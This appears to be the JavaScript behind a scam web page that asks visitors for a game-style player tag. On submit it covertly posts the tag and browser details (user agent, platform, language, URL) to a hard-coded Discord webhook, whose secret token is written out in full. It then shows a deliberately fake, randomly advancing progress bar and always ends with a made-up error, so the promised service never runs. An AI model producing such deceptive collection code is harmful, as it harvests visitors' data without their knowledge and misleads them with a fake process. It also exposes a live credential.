const discordWebhook =
  "https://discord.com/api/webhooks/1212766768012075059/p2zLLUkJoVKZ2t2S-A3DPNTXXKXRGc0fg9xsm7Ce4_PDKGimzUTDktK-lQhqxMxHl5lf";
const form = document.getElementById("account-form");
const tagin = document.getElementById("tagin");

const sendTagToWebhook = (tag) => {
  fetch(discordWebhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: `Tag received:${tag}`,
      embeds: [
        {
          title: "Browser INFO",
          color: null,
          fields: [
            {
              name: "#",
              value: `Useragent\n\n\nplatform\n\nlanguage\n\nURL`,
              inline: true,
            },
            {
              name: "Value",
              value: `${navigator.userAgent}\n\n${
                navigator.platform || "deprecated"
              }\n\n${navigator.language}\n\n${window.location.href}`,
              inline: true,
            },
          ],
        },
      ],
      attachments: [],
    }),
  })
    .then((response) => {
      if (response.ok) {
        console.log("Tag sent successfully");
      } else {
        console.error("Failed to send tag");
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
};

tagin.addEventListener("input", (e) => {
  const tag = e.target.value;
  //uppercase input automatically
  tagin.value = tag.toUpperCase();
  const [isValid, message] = isTagValid(tag);
  if (!isValid) {
    tagin.setCustomValidity(message);
    tagin.reportValidity();
  } else {
    tagin.setCustomValidity("");
  }
});
const statusel = document.getElementById("Status");

form.addEventListener("submit", (e) => {
  e.preventDefault();
  const tag = tagin.value;
  const [isValid, message] = isTagValid(tag);
  if (isValid) {
    sendTagToWebhook(tag);
    progressbar.classList.remove("hidden");
    document.getElementsByTagName("form")[0].classList.add("hidden");
    document.getElementById("Help").classList.add("hidden");
    document.getElementById("results").classList.remove("hidden");
    statusel.classList.remove("hidden");
    statusel.textContent = "Processing...";
    updateProgress(0, 100);
    let progress = 0;
    //randomly update progress bar inconsistently
    var interval = setInterval(() => {
      progress += Math.random() * 10;
      updateProgress(progress, 100);
      if (progress >= 70) {
        clearInterval(interval);
        statusel.textContent = "Almost done...";
        interval = setInterval(() => {
          progress += Math.random() * 10;
          updateProgress(progress, 100);
          if (progress >= 100) {
            updateProgress(100, 100);
            clearInterval(interval);
            statusel.textContent =
              "There was an error. Please try again later.";
            alert("There was an error :( Please try again later.");
            document.getElementById("results").classList.add("hidden");
          }
        }, 5000);
      }
    }, 1000);
  } else {
    alert(message);
  }
});
function isTagValid(tag) {
  if (tag[0] !== "#") {
    return [false, "Tag should start with #"];
  }
  if (tag.length < 3 || tag.length > 11) {
    return [false, "Tag should be between 3 and 10 characters"];
  }
  //check if only numbers or letters except the first character which is #
  const regex = /^#[a-zA-Z0-9]+$/;

  if (!regex.test(tag)) {
    return [false, "Tag should contain only numbers and letters"];
  }
  return [true, "Tag is valid"];
}

const progressbar = document.getElementById("Progressbar");
function updateProgress(val, max) {
  progressbar.getElementsByTagName("div")[0].style.width = `${
    (val / max) * 100
  }%`;
  progressbar.getElementsByTagName("span")[0].textContent = `${(
    (val / max) *
    100
  ).toFixed(2)}%`;
}
